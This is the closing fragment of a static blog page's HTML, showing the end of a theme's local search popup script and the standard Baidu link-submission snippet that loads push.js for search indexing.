                            }
                            if(start == 0){
                                end = 50;
                            }
                            if(end > content.length){
                                end = content.length;
                            }
                            var match_content = content.substring(start, end);
                            // highlight all keywords
                            keywords.forEach(function(keyword){
                                var regS = new RegExp(keyword, "gi");
                                match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
                            });

                            str += "<p class=\"search-result\">" + match_content +"...</p>"
                        }
                        str += "</li>";
                    }
                })};
                str += "</ul>";
                if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
                if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
                $resultContent.innerHTML = str;
            });
            proceedsearch();
        }
    });}

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched == false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };

    });

    $('.popup-btn-close').click(function(e){
      $('.popup').hide();
      $(".popoverlay").remove();
      $('body').css('overflow', '');
    });
    $('.popup').click(function(e){
      e.stopPropagation();
    });
  </script>


  

  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  


</body>
</html>
